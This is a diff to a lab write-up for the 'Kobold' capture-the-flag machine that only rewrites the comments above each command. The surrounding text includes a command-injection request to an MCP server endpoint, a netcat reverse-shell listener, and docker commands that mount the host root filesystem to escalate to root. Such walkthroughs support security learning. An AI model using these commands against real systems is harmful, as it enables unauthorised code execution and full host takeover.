@@ -46,8 +46,8 @@ echo "TARGET_IP kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hos
 
 ### Nmap Scan
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: run a full port scan using Nmap.
+# Why here: identify all active services on the target to map the attack surface.
 nmap -sC -sV -p- TARGET_IP
 ```
 
@@ -69,8 +69,8 @@ Accessing `https://kobold.htb/` revealed a contact page with an email address: *
 Discovered additional subdomains using gobuster:
 
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: enumerate virtual hosts with Gobuster.
+# Why here: find hidden subdomains like mcp.kobold.htb that are not listed in the main DNS records.
 gobuster vhost -u https://kobold.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
   --append-domain -k
 ```
@@ -89,8 +89,8 @@ The `mcp.kobold.htb` subdomain hosts an MCP (Model Context Protocol) server with
 
 **Endpoint Analysis:**
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: probe the MCP connection endpoint with a test command.
+# Why here: verify command execution by triggering a response from the MCP server logic.
 curl -k https://mcp.kobold.htb/api/mcp/connect -X POST \
   -H "Content-Type: application/json" \
   -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'
@@ -102,15 +102,15 @@ curl -k https://mcp.kobold.htb/api/mcp/connect -X POST \
 
 **1. Set up listener:**
 ```bash
-# What it does: opens or uses a TCP connection/listener.
-# Why here: receive shell, transfer data or check connectivity.
+# What it does: start a netcat listener.
+# Why here: catch the incoming bash reverse shell from the MCP container.
 nc -lvnp 4444
 ```
 
 **2. Craft malicious payload:**
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: exploit the command injection vulnerability via a crafted JSON payload.
+# Why here: trigger a reverse shell back to the attacker's listener to gain initial access.
 curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H "Content-Type: application/json" \
   -d '{
@@ -160,14 +160,14 @@ id
 # uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
 
 # Check sudo permissions
-# What it does: lists sudo privileges of the current or specified user.
-# Why here: encontrar comandos permitidos para escalar privilegios.
+# What it does: audit sudo privileges for the 'ben' user.
+# Why here: check for NOPASSWD entries or misconfigured sudoers rules that allow elevation to root.
 sudo -l
 # No sudo access
 
 # Search for interesting files
-# What it does: searches the filesystem with the specified filters.
-# Why here: locate credentials, binaries, configs or writable paths.
+# What it does: search for common configuration and sensitive text files.
+# Why here: identify potential credential leaks in .conf, .ini or .txt files within the user's home or system directories.
 find / -type f -name "*.txt" -o -name "*.conf" -o -name "*.ini" 2>/dev/null | grep -v proc
 ```
 
@@ -176,8 +176,8 @@ find / -type f -name "*.txt" -o -name "*.conf" -o -name "*.ini" 2>/dev/null | gr
 Discovered `/privatebin-data/data` directory containing PrivateBin paste data. However, the paste IDs are required to access the content, and we don't have them yet.
 
 ```bash
-# What it does: lists directory contents.
-# Why here: verificar archivos, permisos o loot en la ruta actual.
+# What it does: audit the PrivateBin data storage directory.
+# Why here: verify if the current user has read access to sensitive paste data stored on the filesystem.
 ls -la /privatebin-data/data/
 # Contains hashed directory names (paste IDs)
 ```
@@ -194,8 +194,8 @@ which docker
 # /usr/bin/docker
 
 # Test docker access
-# What it does: controla contenedores/imagenes Docker con las opciones indicadas.
-# Why here: enumerar o abusar acceso a contenedores en la cadena.
+# What it does: list available Docker images.
+# Why here: verify Docker daemon connectivity and identify available images for container-based privilege escalation.
 docker images
 # permission denied while trying to connect to the Docker daemon socket
 ```
@@ -240,8 +240,8 @@ id
 
 **3. Run privileged container with host filesystem mount:**
 ```bash
-# What it does: controla contenedores/imagenes Docker con las opciones indicadas.
-# Why here: enumerar o abusar acceso a contenedores en la cadena.
+# What it does: run a container with the host's root filesystem mounted.
+# Why here: exploit the docker group membership to gain full read/write access to the host filesystem as root.
 docker run --rm -it --privileged -v /:/hostfs --user root \
   --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2
 ```
@@ -259,8 +259,8 @@ docker run --rm -it --privileged -v /:/hostfs --user root \
 Once inside the container:
 ```bash
 # Verify host mount
-# What it does: lists directory contents.
-# Why here: verificar archivos, permisos o loot en la ruta actual.
+# What it does: list the mounted host filesystem inside the container.
+# Why here: confirm the mount was successful and that we can access the host's root directory.
 ls /hostfs/
 # bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
 
@@ -269,8 +269,8 @@ ls /hostfs/root/
 # root.txt
 
 # Read root flag
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: read the root flag from the mounted host directory.
+# Why here: fulfill the final objective by capturing the root flag after bypassing container isolation.
 cat /hostfs/root/root.txt
 ```
 
@@ -279,8 +279,8 @@ cat /hostfs/root/root.txt
 ## Root Flag
 
 ```bash
-# What it does: controla contenedores/imagenes Docker con las opciones indicadas.
-# Why here: enumerar o abusar acceso a contenedores en la cadena.
+# What it does: one-liner to extract the root flag via Docker.
+# Why here: demonstrate a concise execution path to recover the final flag.
 docker run --rm -i --privileged -v /:/hostfs --user root \
   --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 \
   -c "cat /hostfs/root/root.txt"
@@ -296,8 +296,8 @@ docker run --rm -i --privileged -v /:/hostfs --user root \
 
 If docker is available with SUID bit:
 ```bash
-# What it does: controla contenedores/imagenes Docker con las opciones indicadas.
-# Why here: enumerar o abusar acceso a contenedores en la cadena.
+# What it does: chroot into the host filesystem via a Docker container.
+# Why here: gain a full interactive shell on the host system while remaining inside a container context.
 docker run -v /:/host -it alpine chroot /host /bin/bash
 ```
 
@@ -305,8 +305,8 @@ docker run -v /:/host -it alpine chroot /host /bin/bash
 
 If `/var/run/docker.sock` is accessible:
 ```bash
-# What it does: controla contenedores/imagenes Docker con las opciones indicadas.
-# Why here: enumerar o abusar acceso a contenedores en la cadena.
+# What it does: interact with the Docker daemon via the UNIX socket.
+# Why here: verify if the Docker socket is accessible for administrative commands without group membership.
 docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
 ```
 
@@ -337,8 +337,8 @@ docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bi
 
 ```bash
 # Test basic command execution
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: probe the MCP API for command injection.
+# Why here: verify the vulnerability by triggering a safe command like 'id'.
 curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H "Content-Type: application/json" \
   -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'
@@ -364,8 +364,8 @@ groups
 newgrp docker
 
 # Mount host filesystem
-# What it does: controla contenedores/imagenes Docker con las opciones indicadas.
-# Why here: enumerar o abusar acceso a contenedores en la cadena.
+# What it does: establish a privileged shell via container mount.
+# Why here: provide a one-liner reference for escaping the container to the host filesystem.
 docker run --rm -it --privileged -v /:/hostfs --user root alpine /bin/bash
 
 # One-liner to read specific file
